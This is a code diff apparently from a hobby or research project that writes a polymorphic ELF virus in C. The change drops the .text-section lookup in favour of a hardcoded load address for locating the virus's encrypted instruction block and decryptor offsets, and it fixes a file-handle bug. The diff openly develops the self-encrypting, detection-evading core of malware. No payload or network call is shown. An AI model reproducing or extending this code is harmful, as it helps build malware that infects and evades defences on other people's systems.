@@ -11,13 +11,14 @@
 #include <sys/mman.h>
 
 
-unsigned long offset; /* will store the offset of the .text section */
+/* 
+WARNING: Ensure the default LOAD address of executable match below
+compile once and execute this: readelf -l virus | less
+check the first occurance of LOAD, it should be 0x0000000000400000
 
-void  *data;
-Elf64_Ehdr    *elf;
-Elf64_Shdr    *shdr;
-int       fd;
-char      *strtab;
+If different value, update the _LOAD_ value below
+*/
+#define _LOAD_ 0x0000000000400000
 
 char *filename;
 
@@ -30,50 +31,17 @@ int getfilename(int argc, char *argv[]){
 	return 0;
 }
 
-int filesize(int fd)
-{
-  return (lseek(fd, 0, SEEK_END));
-}
-
-
-void text_offset(Elf64_Shdr *shdr, char *strTab, int shNum, uint8_t *data)
-{
-  int   i;  
-
-  for(i = 0; i < shNum; i++) {
-    size_t k;
-    //  printf("%02d: %s Offset %lx\n", i, &strTab[shdr[i].sh_name], 
-    //     shdr[i].sh_offset);
-	if(strcmp(".text", &strTab[shdr[i].sh_name]) == 0){
-		offset =  shdr[i].sh_offset;
-	}
-
-  }
-}
-
 int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
 {
 
-	/* open the virus elf file and get the offset to the .text section*/
-	fd = open(filename, O_RDONLY);
-	data = mmap(NULL, filesize(fd), PROT_READ, MAP_SHARED, fd, 0);
-	elf = (Elf64_Ehdr *) data;
-	shdr = (Elf64_Shdr *) (data + elf->e_shoff);
-	strtab = (char *)(data + shdr[elf->e_shstrndx].sh_offset);
-	
-	text_offset(shdr, strtab, elf->e_shnum, (uint8_t*)data);
-	close(fd);
 
 	// seed the random number generator
 	srand(time(NULL));
 
-	// get base address of executable
-	unsigned long base_addr = virus_instruction_begin - offset;
-
 	// calculate offset of virus_instruction_begin in relative to base address of executable
-	virus_instruction_begin = virus_instruction_begin - base_addr;
+	virus_instruction_begin = virus_instruction_begin - _LOAD_;
 	// calculate offset of virus_decrypt_offset in relative to base address of executable
-	virus_decrypt_offset = virus_decrypt_offset - base_addr;
+	virus_decrypt_offset = virus_decrypt_offset - _LOAD_;
 
 
 	FILE *f = fopen(filename, "rb");
@@ -81,10 +49,10 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	long fsize = ftell(f);
 	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
 
-	char *string = malloc(fsize + 1);
+	char *string = (char*) malloc(fsize + 1);
 	if(!string)
 	{
-			fclose(filename);
+			fclose(f);
 			printf("Data allocation failed\n");
 			return 1;
 	}
